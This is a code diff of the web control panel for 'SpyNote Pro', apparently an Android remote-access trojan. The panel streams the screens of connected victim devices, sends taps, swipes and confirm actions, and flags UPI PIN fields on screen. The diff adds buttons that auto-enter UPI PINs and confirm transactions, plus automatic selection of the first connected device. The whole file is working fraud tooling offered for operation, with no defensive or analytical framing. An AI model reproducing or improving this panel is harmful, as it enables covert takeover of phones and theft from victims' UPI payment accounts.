@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Pro - UPI Control v7.3.1</title>
+    <title>📱 SpyNote Pro - UPI Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
@@ -25,23 +25,23 @@
             width: 380px; height: 820px; margin: 30px auto; 
             background: #111; border: 30px solid #222; border-radius: 60px; 
             position: relative; cursor: pointer; touch-action: none;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.1);
         }
         #screen-canvas { 
             width: 100%; height: 100%; background: #000; border-radius: 25px;
-            image-rendering: pixelated;
+            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
         }
         #layout-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
             pointer-events: none; border-radius: 25px; z-index: 10;
         }
         .layout-element {
-            position: absolute; background: rgba(0,255,136,0.25); border: 2px solid #00ff88;
-            border-radius: 4px; transition: all 0.2s;
+            position: absolute; background: rgba(0,255,136,0.4); border: 2px solid #00ff88;
+            border-radius: 6px; transition: all 0.2s; pointer-events: none;
         }
-        .layout-element:hover { background: rgba(0,255,136,0.5); transform: scale(1.05); }
+        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05); }
         .pin-element { background: rgba(255,100,100,0.6) !important; border-color: #ff6666 !important; }
-        .pin-element:hover { background: rgba(255,100,100,0.9) !important; }
+        .done-element { background: rgba(255,215,0,0.6) !important; border-color: #ffd700 !important; }
 
         #stats { 
             position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
@@ -61,20 +61,16 @@
         button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
         .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
         .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
-        #pinList { 
-            position: fixed; top: 50%; right: 15px; transform: translateY(-50%); 
-            background: rgba(0,0,0,0.95); padding: 15px; border-radius: 10px; 
-            max-height: 300px; overflow-y: auto; width: 220px; display: none;
-            backdrop-filter: blur(20px); border: 1px solid #333;
+        #upi-controls { 
+            position: fixed; bottom: 25px; right: 25px; background: rgba(0,0,0,0.95); 
+            padding: 20px; border-radius: 20px; backdrop-filter: blur(20px); border: 1px solid #333;
         }
-        .pin-item { padding: 8px; background: #ff4444; margin: 5px 0; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .pin-item:hover { background: #ff6666; }
     </style>
 </head>
 <body>
     <div id="devices">
-        <h3 style="margin-bottom: 15px; color: #00ff88;">📱 Live Devices</h3>
-        <div id="device-list">Loading...</div>
+        <h3 style="margin-bottom: 15px; color: #00ff88;">📱 Devices Online</h3>
+        <div id="device-list">Loading devices...</div>
     </div>
     
     <div id="stats">
@@ -82,12 +78,7 @@
         <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
         <div>Device: <span id="deviceName">-</span></div>
         <div id="layoutInfo" style="font-size: 11px; color: #aaa;">Layout: OFF</div>
-        <div>Pins Found: <span id="pinCount">0</span></div>
-    </div>
-
-    <div id="pinList">
-        <h4 style="margin-bottom: 10px; color: #ff6666;">🎯 UPI PINS</h4>
-        <div id="pin-list-items"></div>
+        <div id="elementsCount" style="font-size: 11px; color: #00ff88;">0 elements</div>
     </div>
 
     <div id="phone-frame">
@@ -99,8 +90,14 @@
         <button onclick="sendBack()">🔙 Back</button>
         <button onclick="sendHome()">🏠 Home</button>
         <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">🗺️ Layout</button>
-        <button onclick="togglePinList()">📍 Pins</button>
         <button onclick="toggleFullScreen()">📱 Full</button>
+    </div>
+
+    <div id="upi-controls">
+        <h4 style="color: #00ff88; margin-bottom: 10px;">UPI Auto</h4>
+        <button onclick="autoUpiPin('123456')">🔢 PIN: 123456</button><br><br>
+        <button onclick="autoUpiPin('000000')">🔢 PIN: 000000</button><br><br>
+        <button onclick="sendConfirm()">✅ CONFIRM</button>
     </div>
 
     <script>
@@ -110,16 +107,13 @@
         let frameCount = 0, lastFrameTime = 0, avgFps = 0;
         let frameQueue = [];
         let isDragging = false, dragStart = {};
-        let showLayout = false, showPinList = false;
+        let showLayout = true; // 🔥 Always ON by default
         let layoutElements = [];
-        let canvas, ctx, overlayCtx, phoneFrame, pinList;
+        let canvas, ctx, overlayCtx, phoneFrame;
 
-        // Initialize elements
         canvas = document.getElementById('screen-canvas');
-        ctx = canvas.getContext('2d');
         overlayCtx = document.getElementById('layout-overlay').getContext('2d');
         phoneFrame = document.getElementById('phone-frame');
-        pinList = document.getElementById('pinList');
 
         socket.on('connect', () => {
             document.getElementById('status').textContent = '🟢 LIVE';
@@ -157,13 +151,15 @@
                 canvas.width = rect.width;
                 canvas.height = rect.height;
                 
-                ctx.imageSmoothingEnabled = false;
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                const screenCtx = canvas.getContext('2d');
+                screenCtx.imageSmoothingEnabled = false;
+                screenCtx.clearRect(0, 0, canvas.width, canvas.height);
+                screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                 
-                // 🔥 FIX: Always render layout overlay
+                // 🔥 Always render layout overlay
                 if (data.layout && data.layout.length > 0) {
                     renderLayoutOverlay(data.layout, rect);
+                    document.getElementById('elementsCount').textContent = data.layout.length + ' elements';
                 }
                 
                 if (frameQueue.length > 0) {
@@ -183,51 +179,32 @@
             
             overlayCtx.clearRect(0, 0, rect.width, rect.height);
             layoutElements = [];
-            let pinElements = [];
             
-            layout.forEach((element, index) => {
+            layout.forEach((element) => {
                 const x = (element.bounds.left / deviceWidth) * rect.width;
                 const y = (element.bounds.top / deviceHeight) * rect.height;
                 const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                 const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                 
                 const isPin = element.isPin || false;
+                const isDone = element.isDone || false;
                 
-                if (isPin) {
-                    pinElements.push({
-                        text: element.text || element.contentDescription || '',
-                        centerX: element.bounds.centerX,
-                        centerY: element.bounds.centerY
-                    });
-                }
-                
-                // Draw rectangle
-                overlayCtx.fillStyle = isPin ? 'rgba(255,100,100,0.4)' : 'rgba(0,255,136,0.25)';
-                overlayCtx.strokeStyle = isPin ? '#ff6666' : '#00ff88';
-                overlayCtx.lineWidth = 2;
+                // 🔥 Draw element
+                overlayCtx.fillStyle = isDone ? 'rgba(255,215,0,0.5)' : 
+                                      isPin ? 'rgba(255,100,100,0.6)' : 'rgba(0,255,136,0.4)';
+                overlayCtx.strokeStyle = isDone ? '#ffd700' : 
+                                        isPin ? '#ff6666' : '#00ff88';
+                overlayCtx.lineWidth = 3;
                 overlayCtx.strokeRect(x, y, w, h);
-                overlayCtx.font = 'bold 12px monospace';
-                overlayCtx.fillStyle = isPin ? '#ff6666' : '#00ff88';
+                overlayCtx.font = 'bold 14px monospace';
+                overlayCtx.fillStyle = isDone ? '#ffd700' : isPin ? '#ff6666' : '#00ff88';
                 overlayCtx.fillText(
-                    `${(element.text || element.contentDescription || '?').slice(0,6)}`, 
-                    x+4, y+18
+                    `${element.text?.slice(0,6) || element.contentDescription?.slice(0,6) || 'UI'}`, 
+                    x+5, y+20
                 );
                 
-                layoutElements.push({ x, y, w, h, isPin, element, index });
+                layoutElements.push({ x, y, w, h, isPin, isDone, element });
             });
-            
-            updatePinList(pinElements);
-            document.getElementById('pinCount').textContent = pinElements.length;
-        }
-
-        function updatePinList(pins) {
-            const pinListItems = document.getElementById('pin-list-items');
-            pinListItems.innerHTML = pins.map(pin => 
-                `<div class="pin-item" onclick="tapPin('${pin.text}', ${pin.centerX}, ${pin.centerY})">
-                    ${pin.text} 
-                    <small style="float:right;opacity:0.7;">👆</small>
-                </div>`
-            ).join('');
         }
 
         function updateDeviceList(devices) {
@@ -260,29 +237,6 @@
             };
         }
 
-        function sendTap(x, y) {
-            if (!currentDevice) return;
-            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
-        }
-
-        function tapPin(text, x, y) {
-            sendTap(x, y);
-            console.log('🎯 PIN TAPPED:', text, 'at', x, y);
-        }
-
-        function sendSwipe(sx, sy, ex, ey) {
-            if (!currentDevice) return;
-            socket.emit('control', { 
-                deviceId: currentDevice, 
-                action: 'swipe', 
-                startX: sx, startY: sy, endX: ex, endY: ey, duration: 250 
-            });
-        }
-
-        function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
-        function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }
-
-        // Mouse events
         ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
             phoneFrame.addEventListener(event, (e) => {
                 e.preventDefault();
@@ -300,7 +254,6 @@
             });
         });
 
-        // Touch events
         ['touchstart', 'touchmove', 'touchend'].forEach(event => {
             phoneFrame.addEventListener(event, (e) => {
                 e.preventDefault();
@@ -319,19 +272,37 @@
             }, { passive: false });
         });
 
+        function sendTap(x, y) {
+            if (!currentDevice) return;
+            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
+        }
+
+        function sendSwipe(sx, sy, ex, ey) {
+            if (!currentDevice) return;
+            socket.emit('control', { 
+                deviceId: currentDevice, 
+                action: 'swipe', 
+                startX: sx, startY: sy, endX: ex, endY: ey, duration: 250 
+            });
+        }
+
+        function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
+        function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }
+        function sendConfirm() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'confirm' }); }
+
+        function autoUpiPin(pin) {
+            if (!currentDevice) return;
+            socket.emit('control', { deviceId: currentDevice, action: 'upiPin', pin });
+        }
+
         function toggleLayout() {
             showLayout = !showLayout;
             const btn = document.getElementById('layoutBtn');
             const info = document.getElementById('layoutInfo');
             btn.textContent = showLayout ? '📋 Hide Layout' : '🗺️ Show Layout';
             btn.classList.toggle('active');
-            info.textContent = `Layout: ${showLayout ? 'ON (UPI Ready)' : 'OFF'}`;
+            info.textContent = `Layout: ${showLayout ? 'ON (UPI Live)' : 'OFF'}`;
             info.style.color = showLayout ? '#00ff88' : '#aaa';
-        }
-
-        function togglePinList() {
-            showPinList = !showPinList;
-            pinList.style.display = showPinList ? 'block' : 'none';
         }
 
         function toggleFullScreen() {
@@ -342,9 +313,9 @@
             }
         }
 
-        // Click on layout elements
+        // 🔥 Auto-click on layout elements
         phoneFrame.addEventListener('click', (e) => {
-            if (!showLayout || !currentDevice) return;
+            if (!currentDevice || !showLayout) return;
             const rect = phoneFrame.getBoundingClientRect();
             const x = (e.clientX - rect.left) * (deviceWidth / rect.width);
             const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
@@ -356,8 +327,17 @@
             
             if (clickedElement) {
                 sendTap(clickedElement.element.bounds.centerX, clickedElement.element.bounds.centerY);
-                console.log('🎯 ELEMENT TAPPED:', clickedElement.element.text || clickedElement.element.contentDescription);
+                console.log('🎯 CLICKED:', clickedElement.element.text || clickedElement.element.contentDescription);
             }
+        });
+
+        // 🔥 Auto select first device
+        socket.on('devices-update', (devices) => {
+            if (!currentDevice && devices.length > 0) {
+                const firstDevice = devices[0][0];
+                document.querySelector('.device')?.click();
+            }
+            updateDeviceList(devices);
         });
     </script>
 </body>
